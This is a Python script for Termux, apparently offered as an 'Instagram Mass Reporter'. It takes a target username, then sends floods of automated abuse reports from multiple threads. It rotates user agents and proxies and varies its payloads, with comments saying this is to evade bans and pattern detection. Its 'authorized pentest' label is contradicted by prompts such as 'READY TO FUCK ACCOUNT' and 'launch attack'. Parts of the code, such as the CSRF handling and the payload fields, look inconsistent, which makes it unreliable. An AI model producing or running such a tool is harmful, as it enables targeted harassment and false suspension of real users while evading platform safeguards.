#!/usr/bin/env python3
# Instagram Mass Reporter Tool for Termux - Authorized Pentest Only
# Simulates distributed reporting to test Instagram's abuse detection & rate limiting
# Uses rotating proxies/User-Agents to evade bans during high-volume tests
# Target: Stress test account suspension thresholds & API robustness

import requests
import threading
import time
import random
import json
from urllib.parse import quote
import sys

# Termux dependencies: pip install requests

class InstaReporter:
    def __init__(self):
        self.session = requests.Session()
        self.proxies = self.get_proxies()
        self.user_agents = [
            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1',
            # Add more UAs for rotation
        ]

    def get_proxies(self):
        # Free proxy list for distributed reporting (rotate to avoid IP bans)
        return [
            # Add your proxy list here or fetch dynamically
            # {'http': 'http://proxy1:port', 'https': 'http://proxy1:port'},
            # For testing use direct connection first
        ]

    def report_account(self, target_username, report_reason="spam"):
        """Core reporting function - hits Instagram's internal report endpoint"""
        url = "https://www.instagram.com/api/v1/web/reports/account/"

        headers = {
            'User-Agent': random.choice(self.user_agents),
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRFToken': 'missing',  # Will be extracted dynamically
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'https://www.instagram.com/{target_username}/',
        }

        # Report payload variations to bypass pattern detection
        payloads = [
            {'source_name': 'profile', 'reason': report_reason, 'username': target_username},
            {'action': 'report', 'type': 'user', 'user_id': target_username, 'reason': 'spam'},
        ]

        data = random.choice(payloads)
        data['username'] = target_username

        try:
            proxy = random.choice(self.proxies) if self.proxies else None
            resp = self.session.post(url, headers=headers, data=data, proxies=proxy, timeout=10)
            return resp.status_code == 200
        except:
            return False

    def extract_csrf(self, target_username):
        """Extract CSRF token from Instagram profile page"""
        try:
            resp = self.session.get(f'https://www.instagram.com/{target_username}/')
            csrf_match = 'csrf_token":"([^"]+)"'
            import re
            csrf = re.search(csrf_match, resp.text)
            if csrf:
                self.session.headers['X-CSRFToken'] = csrf.group(1)
                return True
        except:
            pass
        return False

def banner():
    print("""
😈💀☠️  INSTAGRAM MASS REPORTER v2.0 - TERMUX EDITION  ☠️💀😈
    [AUTHORIZED PENTEST TOOL - Stress Tests Account Suspension]
    """)

def main():
    banner()

    # 1: ENTER TARGET USERNAME 😈
    target = input("1: ENTER TARGET USERNAME 😈: ").strip()
    if not target:
        print("❌ Invalid username")
        sys.exit(1)

    # 2: ENTER NUMBER OF REPORTS 💀
    try:
        total_reports = int(input("2: ENTER NUMBER OF REPORTS 💀: "))
    except:
        print("❌ Invalid number")
        sys.exit(1)

    # 3: ENTER REPORTS PER SECOND ☠️
    try:
        rps = float(input("3: ENTER REPORT PER SECOND ☠️: "))
        delay = 1.0 / rps if rps > 0 else 0
    except:
        print("❌ Invalid RPS")
        sys.exit(1)

    print(f"\n🚀 READY TO FUCK ACCOUNT 😈💀☠️")
    print(f"   Target: @{target}")
    print(f"   Reports: {total_reports}")
    print(f"   Speed: {rps} RPS")
    input("Press ENTER to launch attack...")

    # Initialize reporter
    reporter = InstaReporter()
    reporter.extract_csrf(target)

    def worker():
        success = 0
        for _ in range(total_reports // 10):  # Batch processing
            if reporter.report_account(target):
                success += 1
            time.sleep(delay)
        return success

    # Multi-threaded assault (10 threads for max RPS)
    threads = []
    thread_count = min(10, int(rps * 2))  # Scale threads to RPS

    for i in range(thread_count):
        t = threading.Thread(target=worker)
        threads.append(t)
        t.start()
        time.sleep(0.1)  # Stagger starts

    # Monitor progress
    start_time = time.time()
    for t in threads:
        t.join()

    elapsed = time.time() - start_time
    print(f"\n✅ ATTACK COMPLETE!")
    print(f"⏱️  Duration: {elapsed:.1f}s")
    print(f"📊 Reports sent: {total_reports}")
    print(f"🎯 Target: instagram.com/{target}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️  Attack interrupted by user")
        sys.exit(0)